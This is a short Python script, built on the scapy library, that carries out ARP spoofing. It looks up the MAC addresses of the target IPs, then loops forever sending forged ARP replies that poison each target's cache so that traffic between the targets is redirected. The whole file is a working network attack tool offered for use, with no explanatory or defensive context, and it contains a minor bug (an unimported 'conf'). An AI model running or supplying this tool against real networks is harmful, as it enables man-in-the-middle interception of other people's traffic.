#!/usr/bin/python3


import argparse
import time

from scapy.all import ARP, get_if_hwaddr, send, sr1


def get_mac_address(ip):
    return sr1(ARP(pdst=ip)).hwsrc


parser = argparse.ArgumentParser(description='ARP spoof')
parser.add_argument('-t', '--targets', type=str, required=True)
parser.add_argument('-a', '--addresses', type=str)
parser.add_argument('-d', '--delay', type=int, default=1)

args = parser.parse_args()


target_list = args.targets.split(',') if ',' in args.targets else [args.targets]

if args.addresses is None:
    args.addresses = get_if_hwaddr(conf.iface)

address_list = args.addresses.split(',') if ',' in args.addresses else [args.addresses] * len(target_list)


if len(target_list) != len(address_list):
    raise Exception('Target list size and address list size do not match')


mac_address_list = [get_mac_address(target) for target in target_list]

while True:
    for i in range(0, len(target_list)):
        for j in range(0, len(target_list)):
            if i != j:
                send(ARP(hwsrc=address_list[j], psrc=target_list[j],
                         hwdst=mac_address_list[i], pdst=target_list[i], op=2))

    time.sleep(args.delay)
